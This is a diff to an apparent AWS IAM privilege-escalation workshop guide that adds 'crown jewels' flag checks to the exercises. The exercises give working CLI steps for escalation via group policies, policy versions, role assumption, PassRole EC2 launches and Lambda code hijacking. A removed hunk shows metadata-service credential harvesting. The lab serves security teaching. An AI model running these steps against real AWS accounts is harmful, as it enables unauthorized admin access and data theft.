@@ -347,7 +347,19 @@ aws sts get-caller-identity --profile iamws-group-admin-user
 
 You should see you're now operating as `iamws-group-admin-user`.
 
-**Step 2: Check with groups your user is part of**
+**Step 2: Try to access the crown jewels**
+
+```bash
+ACCOUNT_ID=$(aws sts get-caller-identity --query Account --output text \
+  --profile iamws-group-admin-user)
+
+aws s3 cp s3://iamws-crown-jewels-${ACCOUNT_ID}/flag.txt - \
+  --profile iamws-group-admin-user
+```
+
+**Expected:** `AccessDenied` — this low-privilege user can't reach the crown jewels... yet.
+
+**Step 3: Check which groups your user is part of**
 
 ### Check which groups the attacker belongs to
 ```
@@ -358,7 +370,7 @@ aws iam list-groups-for-user --user-name iamws-group-admin-user \
 
 You'll see the user is a member of `iamws-dev-team`.
 
-**Step 3: View the current benign inline policy**
+**Step 4: View the current benign inline policy**
 ```bash
 # List inline policies on the group
 aws iam list-group-policies --group-name iamws-dev-team \
@@ -372,9 +384,9 @@ aws iam get-group-policy \
   --profile iamws-group-admin-user
 ```
 
-Note the limited permissions (S3/EC2 read-only).
+Note the limited permissions (EC2 read-only).
 
-**Step 4: Write an admin inline policy on the group**
+**Step 5: Write an admin inline policy on the group**
 ```bash
 aws iam put-group-policy \
   --group-name iamws-dev-team \
@@ -390,14 +402,14 @@ aws iam put-group-policy \
   --profile iamws-group-admin-user
 ```
 
-**Step 5: Verify the escalation**
+**Step 6: Verify the escalation — claim the crown jewels**
 ```bash
-# Now test an admin action - list all IAM users
-aws iam list-users --query 'Users[].UserName' --output table \
+# Now grab the crown jewels
+aws s3 cp s3://iamws-crown-jewels-${ACCOUNT_ID}/flag.txt - \
   --profile iamws-group-admin-user
 ```
 
-**You just escalated a group admin to full administrator** by writing an inline policy on a group you belong to. Every member of `iamws-dev-team` is now also an admin.
+**You just escalated a group admin to full administrator** by writing an inline policy on a group you belong to. The crown jewels are yours — every member of `iamws-dev-team` is now also an admin.
 
 ### Explore on Your Own
 
@@ -460,9 +472,21 @@ aws sts get-caller-identity --profile iamws-policy-developer-user
 
 You should see you're now operating as `iamws-policy-developer-user`.
 
-**Step 2: Identify the policy attached to this user**
+**Step 2: Try to access the crown jewels**
+
 ```bash
-# Store the account ID
+ACCOUNT_ID=$(aws sts get-caller-identity --query Account --output text \
+  --profile iamws-policy-developer-user)
+
+aws s3 cp s3://iamws-crown-jewels-${ACCOUNT_ID}/flag.txt - \
+  --profile iamws-policy-developer-user
+```
+
+**Expected:** `AccessDenied` — this developer can't reach the crown jewels... yet.
+
+**Step 3: Identify the policy attached to this user**
+```bash
+# Store the account ID (already set above)
 ACCOUNT_ID=$(aws sts get-caller-identity --query Account --output text \
   --profile iamws-policy-developer-user)
 
@@ -478,9 +502,9 @@ aws iam get-policy-version \
   --profile iamws-policy-developer-user
 ```
 
-Note the limited permissions (S3, EC2 read-only).
+Note the limited permissions (EC2 read-only).
 
-**Step 3: Create a new version of the policy with admin permissions**
+**Step 4: Create a new version of the policy with admin permissions**
 ```bash
 aws iam create-policy-version \
   --policy-arn $POLICY_ARN \
@@ -496,14 +520,14 @@ aws iam create-policy-version \
   --profile iamws-policy-developer-user
 ```
 
-**Step 4: Verify the escalation**
+**Step 5: Verify the escalation — claim the crown jewels**
 ```bash
-# Now test an admin action - list all IAM users
-aws iam list-users --query 'Users[].UserName' --output table \
+# Now grab the crown jewels
+aws s3 cp s3://iamws-crown-jewels-${ACCOUNT_ID}/flag.txt - \
   --profile iamws-policy-developer-user
 ```
 
-**You just escalated a low-privilege developer to full administrator** by modifying a policy attached to yourself.
+**You just escalated a low-privilege developer to full administrator** by modifying a policy attached to yourself. The crown jewels are yours.
 
 ### What You Learned
 
@@ -585,7 +609,16 @@ aws sts get-caller-identity --profile iamws-role-assumer-user
 
 You should see you're now operating as `iamws-role-assumer-user`.
 
-**Step 2: Assume the privileged admin role**
+**Step 2: Try to access the crown jewels**
+
+```bash
+aws s3 cp s3://iamws-crown-jewels-${ACCOUNT_ID}/flag.txt - \
+  --profile iamws-role-assumer-user
+```
+
+**Expected:** `AccessDenied` — this user can't reach the crown jewels... yet.
+
+**Step 3: Assume the privileged admin role**
 
 This is the exploit — the user's `sts:AssumeRole` permission combined with the permissive trust policy allows assuming the admin role:
 
@@ -602,12 +635,15 @@ export AWS_SECRET_ACCESS_KEY=$(echo $ADMIN_CREDS | jq -r '.SecretAccessKey')
 export AWS_SESSION_TOKEN=$(echo $ADMIN_CREDS | jq -r '.SessionToken')
 ```
 
-**Step 3: Verify escalation**
+**Step 4: Verify escalation — claim the crown jewels**
 ```bash
 aws sts get-caller-identity
+
+# Now grab the crown jewels with the escalated role credentials
+aws s3 cp s3://iamws-crown-jewels-${ACCOUNT_ID}/flag.txt -
 ```
 
-You should see `iamws-privileged-admin-role` in the ARN. You now have `AdministratorAccess`.
+You should see `iamws-privileged-admin-role` in the ARN and the crown jewels file contents. You now have `AdministratorAccess`.
 
 ### Cleanup
 
@@ -694,7 +730,19 @@ With this condition, PassRole would only work when handing a role to Lambda — 
 
 ### Part D: Exploit the Vulnerability
 
-**Step 1: Find privileged instance profiles**
+**Step 1: Try to access the crown jewels**
+
+```bash
+ACCOUNT_ID=$(aws sts get-caller-identity --query Account --output text \
+  --profile iamws-ci-runner-user)
+
+aws s3 cp s3://iamws-crown-jewels-${ACCOUNT_ID}/flag.txt - \
+  --profile iamws-ci-runner-user
+```
+
+**Expected:** `AccessDenied` — this CI runner can't reach the crown jewels... yet.
+
+**Step 2: Find privileged instance profiles**
 ```bash
 aws iam list-instance-profiles \
   --query 'InstanceProfiles[].{Name:InstanceProfileName,Roles:Roles[].RoleName}' \
@@ -704,7 +752,7 @@ aws iam list-instance-profiles \
 
 You'll see `iamws-prod-deploy-profile` with role `iamws-prod-deploy-role` (which has `*:*` permissions). This is our target.
 
-**Step 2: Find a suitable AMI and subnet**
+**Step 3: Find a suitable AMI and subnet**
 
 We need an Amazon Linux 2 AMI (which has the SSM agent pre-installed) and a subnet to launch into:
 
@@ -730,7 +778,7 @@ SUBNET_ID=$(aws ec2 describe-subnets \
 echo "Subnet: $SUBNET_ID"
 ```
 
-**Step 3: Launch EC2 with the privileged instance profile**
+**Step 4: Launch EC2 with the privileged instance profile**
 
 This is the vulnerability proven — unrestricted `iam:PassRole` allows attaching an admin role to a new EC2:
 
@@ -747,7 +795,7 @@ INSTANCE_ID=$(aws ec2 run-instances \
 echo "Launched instance: $INSTANCE_ID"
 ```
 
-**Step 4: Wait for the instance and SSM agent to come online**
+**Step 5: Wait for the instance and SSM agent to come online**
 
 The instance needs ~60-90 seconds to boot and register with SSM:
 
@@ -772,7 +820,7 @@ for i in $(seq 1 30); do
 done
 ```
 
-**Step 5: Start an interactive SSM session and harvest credentials**
+**Step 6: Start an interactive SSM session and claim the crown jewels**
 
 ```bash
 aws ssm start-session --target $INSTANCE_ID \
@@ -783,22 +831,17 @@ Once inside the session, run the following commands to prove you have admin acce
 
 ```bash
 # Inside the SSM session:
-# Get a token for IMDSv2
-TOKEN=$(curl -s -X PUT "http://169.254.169.254/latest/api/token" \
-  -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
-
-# Retrieve the role credentials from the instance metadata service
-curl -s -H "X-aws-ec2-metadata-token: $TOKEN" \
-  http://169.254.169.254/latest/meta-data/iam/security-credentials/iamws-prod-deploy-role
-
 # Prove admin access
 aws sts get-caller-identity
-aws iam list-users --query 'Users[].UserName' --output table
+
+# Grab the crown jewels from inside the EC2 instance
+ACCOUNT_ID=$(aws sts get-caller-identity --query Account --output text)
+aws s3 cp s3://iamws-crown-jewels-${ACCOUNT_ID}/flag.txt -
 ```
 
-You should see the caller identity shows `iamws-prod-deploy-role` — you now have full admin access from inside the EC2 instance.
+You should see the caller identity shows `iamws-prod-deploy-role` and the crown jewels file contents — you now have full admin access from inside the EC2 instance.
 
-**Step 6: Exit the session**
+**Step 7: Exit the session**
 ```bash
 exit
 ```
@@ -822,10 +865,6 @@ exit
 
 **Real-world scenario:** A developer can deploy code to Lambda functions but shouldn't be able to access production resources. If they can modify ANY Lambda (not just their own), they can target Lambdas with privileged roles.
 
-### Visualize in awspx
-
-Open **Advanced Search** in awspx. Set **From** to `iamws-lambda-developer-user` and **To** to `Effective Admin`, then click **Run** (▶). You should see a maroon dashed attack edge showing the Lambda-related escalation path — awspx has identified that this user can modify a privileged Lambda function to reach admin.
-
 ### Part A: Identify with pmapper
 
 ```bash
@@ -843,10 +882,6 @@ Expected output:
   the administrative principal role/iamws-privileged-lambda-role:
    * user/iamws-lambda-developer-user can use Lambda to edit an existing
      function (arn:aws:lambda:...:function:iamws-privileged-lambda)
-
-* user/iamws-group-admin-user can escalate privileges by using
-  iam:PutGroupPolicy to add an administrative inline policy to a
-  group they belong to
 ```
 
 ### Part B: Understand the Attack Category
@@ -862,7 +897,19 @@ Unlike "New PassRole" where you CREATE new compute, "Existing PassRole" exploits
 
 ### Part C: Exploit the Vulnerability
 
-**Step 1: Find the privileged Lambda**
+**Step 1: Try to access the crown jewels**
+
+```bash
+ACCOUNT_ID=$(aws sts get-caller-identity --query Account --output text \
+  --profile iamws-lambda-developer-user)
+
+aws s3 cp s3://iamws-crown-jewels-${ACCOUNT_ID}/flag.txt - \
+  --profile iamws-lambda-developer-user
+```
+
+**Expected:** `AccessDenied` — this Lambda developer can't reach the crown jewels... yet.
+
+**Step 2: Find the privileged Lambda**
 ```bash
 aws lambda list-functions \
   --query 'Functions[?starts_with(FunctionName, `iamws`)].{Name:FunctionName,Role:Role}' \
@@ -872,14 +919,14 @@ aws lambda list-functions \
 
 You'll see `iamws-privileged-lambda` with role `iamws-privileged-lambda-role` (which has `AdministratorAccess`).
 
-**Step 2: View the target function's role**
+**Step 3: View the target function's role**
 ```bash
 aws lambda get-function --function-name iamws-privileged-lambda \
   --query 'Configuration.Role' --output text \
   --profile iamws-lambda-developer-user
 ```
 
-**Step 3: Save the original code hash for reference**
+**Step 4: Save the original code hash for reference**
 ```bash
 ORIGINAL_HASH=$(aws lambda get-function --function-name iamws-privileged-lambda \
   --query 'Configuration.CodeSha256' --output text \
@@ -887,9 +934,9 @@ ORIGINAL_HASH=$(aws lambda get-function --function-name iamws-privileged-lambda 
 echo "Original code hash: $ORIGINAL_HASH"
 ```
 
-**Step 4: Create a malicious Lambda payload**
+**Step 5: Create a malicious Lambda payload**
 
-Create a Python handler that proves admin access by calling `sts:GetCallerIdentity` and `iam:ListUsers`:
+Create a Python handler that proves admin access by reading the crown jewels from S3:
 
 ```bash
 mkdir -p /tmp/iamws-exploit
@@ -900,13 +947,14 @@ import json
 
 def handler(event, context):
     sts = boto3.client('sts')
-    iam = boto3.client('iam')
+    s3 = boto3.client('s3')
 
     identity = sts.get_caller_identity()
 
-    # Prove admin access by listing IAM users
-    users = iam.list_users(MaxItems=10)
-    user_names = [u['UserName'] for u in users['Users']]
+    # Grab the crown jewels from S3
+    bucket = f"iamws-crown-jewels-{identity['Account']}"
+    obj = s3.get_object(Bucket=bucket, Key='flag.txt')
+    crown_jewels = obj['Body'].read().decode('utf-8')
 
     return {
         'statusCode': 200,
@@ -915,10 +963,7 @@ def handler(event, context):
             'Arn': identity['Arn'],
             'UserId': identity['UserId']
         },
-        'proof_of_admin': {
-            'action': 'iam:ListUsers',
-            'result': user_names
-        }
+        'crown_jewels': crown_jewels
     }
 PYEOF
 
@@ -926,7 +971,7 @@ cd /tmp/iamws-exploit && zip -j exploit.zip lambda_function.py
 cd -
 ```
 
-**Step 5: Update the function code**
+**Step 6: Update the function code**
 ```bash
 aws lambda update-function-code \
   --function-name iamws-privileged-lambda \
@@ -934,7 +979,7 @@ aws lambda update-function-code \
   --profile iamws-lambda-developer-user
 ```
 
-**Step 6: Invoke the function and prove admin access**
+**Step 7: Invoke the function and claim the crown jewels**
 ```bash
 aws lambda invoke \
   --function-name iamws-privileged-lambda \
@@ -954,14 +999,11 @@ cat /tmp/iamws-exploit/response.json | jq .
     "Arn": "arn:aws:sts::123456789012:assumed-role/iamws-privileged-lambda-role/iamws-privileged-lambda",
     "UserId": "AROA..."
   },
-  "proof_of_admin": {
-    "action": "iam:ListUsers",
-    "result": ["iamws-ci-runner-user", "iamws-group-admin-user", "iamws-lambda-developer-user", "..."]
-  }
+  "crown_jewels": "  ============================================\n     YOU FOUND THE CROWN JEWELS! ..."
 }
 ```
 
-**You just hijacked a privileged Lambda function** by replacing its code with a credential-exfiltration payload. The Lambda's identity is `iamws-privileged-lambda-role` with `AdministratorAccess`.
+**You just hijacked a privileged Lambda function** by replacing its code to read the crown jewels from S3. The Lambda's identity is `iamws-privileged-lambda-role` with `AdministratorAccess`.
 
 ### Cleanup
 
@@ -1067,6 +1109,9 @@ aws lambda get-function-configuration \
 ```
 
 **You just read production database credentials, API keys, and admin passwords.**
+
+> [!NOTE]
+> **Why no crown jewels S3 check here?** Unlike the other exercises, this is **credential access** — not IAM privilege escalation. The attacker's AWS permissions were never escalated, so the crown jewels S3 bucket stays safely out of reach. But don't underestimate this attack: in production, the exposed secrets (database passwords, API keys, admin credentials) often grant access to data that's just as sensitive as anything in S3 — customer PII in databases, admin consoles for SaaS tools, or credentials for external systems.
 
 ### What You Learned
 
